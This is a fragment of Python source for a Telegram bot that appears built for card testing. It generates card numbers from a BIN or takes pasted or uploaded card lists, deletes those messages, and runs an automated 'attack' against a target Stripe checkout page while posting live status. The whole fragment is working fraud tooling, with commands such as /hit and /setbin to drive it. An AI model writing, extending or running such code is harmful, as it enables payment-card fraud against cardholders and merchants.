    bin_code = context.args[0]
    if len(bin_code) < 6:
        await update.message.reply_text("⚠️ Invalid BIN.")
        return

    url = context.user_data.get('target_url')
    cards = [CardGenerator.generate_one(bin_code) for _ in range(100)]
    context.user_data['awaiting_cards'] = False
    
    await update.message.reply_text(f"✅ Generated 100 cards from {bin_code}. Starting...")
    await run_attack_flow(update, context, url, cards)

async def handle_cards(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.user_data.get('awaiting_cards'): return
    if not await check_permissions(update, context): return

    # Check for cards with regex (don't delete normal chat)
    text_content = update.message.text or ""
    if update.message.caption: text_content += " " + update.message.caption
    
    has_cards = False
    if update.message.document: has_cards = True
    if re.search(r'\d{15,16}', text_content): has_cards = True
    
    if not has_cards: return # Ignore chatting

    # Security: Delete message containing cards
    try: await update.message.delete()
    except: pass

    cards = []
    if update.message.document:
        f = await update.message.document.get_file()
        await f.download_to_drive("temp.txt")
        with open("temp.txt", "r") as fl:
            cards = [l.strip() for l in fl if len(l.strip())>10]
        os.remove("temp.txt")
    elif update.message.text:
        cards = [l.strip() for l in update.message.text.split('\n') if len(l.strip())>10]

    if not cards:
        await update.message.reply_text("❌ No valid cards found.")
        return

    url = context.user_data.get('target_url')
    context.user_data['awaiting_cards'] = False
    
    await run_attack_flow(update, context, url, cards)

async def run_attack_flow(update: Update, context: ContextTypes.DEFAULT_TYPE, url, cards):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    dashboard = await context.bot.send_message(chat_id, "⏳ Initializing...", parse_mode='HTML')
    # Removed pinning as per user request

    last_text = ""
    async def status_callback(msg):
        nonlocal last_text
        if msg != last_text:
            last_text = msg
            try:
                await dashboard.edit_text(
                    f"<b>🚀 ATTACK LIVE</b>\n"
                    f"Target: <a href='{url}'>Stripe Checkout</a>\n"
                    f"Cards: {len(cards)}\n"
                    f"Status:\n{msg}",
                    parse_mode='HTML'
                )
            except: pass
    
    # HEADLESS = FALSE for visible debugging
    # Retrieve info from user_data if available
    target_info = context.user_data.get('target_info', {})
    
    automation = StripeAutomation(headless=False, status_callback=status_callback, target_info=target_info)
    automation.webhook_config['telegram_chat_id'] = str(chat_id) 
    
    # Store owner ID for stop verification
    active_attacks[chat_id] = {
        'automation': automation,
        'owner_id': user_id
    }
    
    try:
        await automation.run_attack(url, cards)
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ Error: {e}")
    finally:
        if chat_id in active_attacks: del active_attacks[chat_id]

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_permissions(update, context): return
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    if chat_id in active_attacks:
        attack_data = active_attacks[chat_id]
        if attack_data['owner_id'] != user_id:
            await update.message.reply_text("⛔ Only the attack owner can stop it.")
            return

        await attack_data['automation'].close()
        await update.message.reply_text("🛑 Stopping...")
    else:
        await update.message.reply_text("⚠️ No active attack.")

def main():
    if not TOKEN:
        print("Error: `telegram_token` missing in config.json")
        return

    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("hit", hit_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("setbin", setbin_command))
    application.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_cards))

    print("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
